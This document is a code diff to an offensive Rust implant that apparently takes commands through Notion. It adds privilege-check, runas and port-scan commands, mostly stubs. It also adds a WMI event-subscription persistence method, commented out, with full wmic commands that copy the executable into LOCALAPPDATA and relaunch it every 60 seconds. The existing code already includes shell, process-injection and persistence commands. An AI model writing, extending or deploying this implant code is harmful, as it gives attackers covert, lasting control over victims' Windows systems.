@@ -18,6 +18,9 @@ use crate::config::ConfigOptions;
 
 #[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
 
+mod isElevated;
+mod portscan;
+
 pub enum CommandType {
     Cd(String),
     Shell(String),
@@ -27,6 +30,9 @@ pub enum CommandType {
     Inject(String),
     Save(String),
     Persist(String),
+    Runas(String),
+    Getprivs,
+    Portscan(String),
     Shutdown,
     Unknown
 }
@@ -67,6 +73,9 @@ impl NotionCommand {
                 "inject"   => CommandType::Inject(command_string),
                 "save"     => CommandType::Save(command_string),
                 "persist"  => CommandType::Persist(command_string),
+                "runas"    => CommandType::Runas(command_string),
+                "getprivs" => CommandType::Getprivs,
+                "portscan" => CommandType::Portscan(command_string),
                 "shutdown" => CommandType::Shutdown,
                 _          => CommandType::Unknown
             };
@@ -202,7 +211,7 @@ impl NotionCommand {
                 Ok(format!("Config file saved to {s}").to_string())
             },
             CommandType::Persist(s) => {
-                #[cfg(windows)]
+                //#[cfg(windows)]
                 // `persist [method] [args]`
                 match s.trim() {
                     "startup" => {
@@ -242,12 +251,69 @@ impl NotionCommand {
                             Ok("LOCALDATA undefined".to_string())
                         }
                     },
+                    "wmic" => {
+                        //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
+                        //With special thanks to: https://github.com/trickster0/OffensiveRust
+                        //OPSEC unsafe! Use with caution
+                        // under construction
+                    /*
+
+                        if let Ok(v) = var("LOCALAPPDATA") {
+                        let mut persist_path: String = v;
+                        persist_path.push_str(r"\notion.exe");
+                        let exe_path = args().nth(0).unwrap();
+                        println!("{exe_path}");
+                        // let mut out_file = File::create(path).expect("Failed to create file");
+                        fs_copy(&exe_path, &persist_path)?;
+
+                        // I basically hate this, but...
+                        
+                        let args1 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Notion", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"##;
+                        let args2 = format!(r##"/c wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Notion", ExecutablePath="{persist_path}",CommandLineTemplate="{persist_path}"##);
+                        let args3 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Notion\"", Consumer="CommandLineEventConsumer.Name=\"Notion\"""##;
+                        
+                        let cmd1 =  { Command::new("cmd")
+                                .args([args1])
+                                .output()
+                                .expect("failed to execute process");
+                        };
+                        let cmd2 =  { Command::new("cmd")
+                                .args([args2])
+                                .output()
+                                .expect("failed to execute process");
+                        };
+                        let cmd3 =  { Command::new("cmd")
+                                .args([args3])
+                                .output()
+                                .expect("failed to execute process")
+                        };
+                    */
+                        return Ok("Under Construction".to_string());
+
+                    },
+
                     _ => Ok("That's not a persistence method!".to_string())                    
                 }
-                #[cfg(not(windows))]
-                Ok("Windows only!".to_string())
         
             },
+            CommandType::Runas(s) => {
+                // TODO: Implement
+                return Ok(String::from("Under Construction!"))
+            },
+            CommandType::Getprivs => {
+                // TODO: Implement Linux check
+                let is_admin = isElevated::is_elevated();
+                println!("{}", is_admin);
+
+                Ok(String::from(format!("Admin Context: {is_admin}").to_string()))
+            },
+
+            CommandType::Portscan(s) => {
+                // TODO: Implement
+                let results = portscan::portscan();
+                return Ok(String::from("Under Construction!"))
+            },
+
             CommandType::Shutdown => {
                 Ok(String::from("Shutting down"))
             },
